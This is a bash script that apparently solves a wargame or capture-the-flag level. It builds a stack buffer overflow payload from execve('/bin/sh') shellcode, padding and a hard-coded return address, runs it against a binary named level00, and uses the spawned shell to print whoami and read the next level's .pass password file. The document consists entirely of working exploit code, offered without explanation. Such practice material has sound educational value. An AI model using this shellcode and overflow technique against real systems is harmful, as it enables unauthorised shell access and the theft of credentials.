#!/bin/bash

GETPASS="cat /home/user/level01/.pass"

set -x

SHELLCODE_ADDRESS="\x10\xa0\x04\x08"
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
PADDING=`python -c 'print("A" * 76)'` # OFFSET=108 - SHELLCODE_LENGTH=28 - SHELLCODE_ADDRESS=4
RETADDRESS="\x0c\xa0\x04\x08"

python -c "print('$SHELLCODE_ADDRESS' + '$SHELLCODE' + '$PADDING' + '$RETADDRESS')" > /tmp/exploit0

(~/level00 `cat /tmp/exploit0`) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI
